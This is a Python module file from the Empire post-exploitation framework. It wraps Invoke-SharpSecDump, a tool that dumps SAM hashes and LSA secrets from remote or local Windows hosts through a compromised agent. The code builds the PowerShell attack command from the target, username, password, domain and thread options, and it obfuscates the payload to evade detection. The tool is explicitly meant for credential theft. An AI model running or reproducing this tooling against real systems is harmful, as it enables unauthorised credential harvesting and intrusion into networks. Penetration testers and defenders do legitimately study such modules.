from __future__ import print_function

from builtins import object
from builtins import str

from empire.server.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-SharpSecDump',

            # List of one or more authors for the module
            'Author': ['@G0ldenGunSec', '@S3cur3Th1sSh1t'],

            # More verbose multi-line description of the module
            'Description': ('.Net port of the remote SAM + LSA Secrets dumping functionality of impacket\'s'
                            ' secretsdump.py. By default runs in the context of the current user.'),

            'Software': '',

            'Techniques': ['T1003'],

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '4',

            # List of any references/other comments
            'Comments': [
                'https://github.com/G0ldenGunSec/SharpSecDump'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description':   'Agent to run on.',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Target': {
                'Description':   'Comma seperated list of IP\'s / hostnames to scan. Please don\'t include'
                                 ' spaces between addresses. Can also dump hashes on the local system by '
                                 'setting target to 127.0.0.1 ',
                'Required'   :   True,
                'Value'      :   ''
            },
            'Username': {
                'Description': 'Username to use, if you want to use alternate credentials to run. '
                               'Must use with -p and -d flags'
                               ', Misc)',
                'Required': False,
                'Value': ''
            },
            'Password': {
                'Description': 'Plaintext password to use, if you want to use alternate credentials to run. Must use '
                               'with -u and -d flags',
                'Required': False,
                'Value': ''
            },
            'Domain': {
                'Description': 'Domain to use, if you want to use alternate credentials to run (. for local domain). '
                               'Must use with -u and -p flags',
                'Required': False,
                'Value': ''
            },
            'Threads': {
                'Description': 'Threads to use to concurently enumerate multiple remote hosts (Default: 10)',
                'Required': False,
                'Value': '10'
            },
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        # First method: Read in the source script from module_source
        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-SharpSecDump.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = 'Invoke-SharpSecDump -Command "'

        # Add any arguments to the end execution of the script
        if self.options['Target']['Value']:
            scriptEnd += " -target=" + str(self.options['Target']['Value'])
        if self.options['Username']['Value']:
            scriptEnd += " -u=" + str(self.options['Username']['Value'])
        if self.options['Password']['Value']:
            scriptEnd += " -p=" + str(self.options['Password']['Value'])
        if self.options['Domain']['Value']:
            scriptEnd += " -d=" + str(self.options['Domain']['Value'])
        if self.options['Threads']['Value'].lower():
            scriptEnd += " -threads=" + str(self.options['Threads']['Value'])

        scriptEnd = scriptEnd.replace('" ', '"')
        scriptEnd += '"'

        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
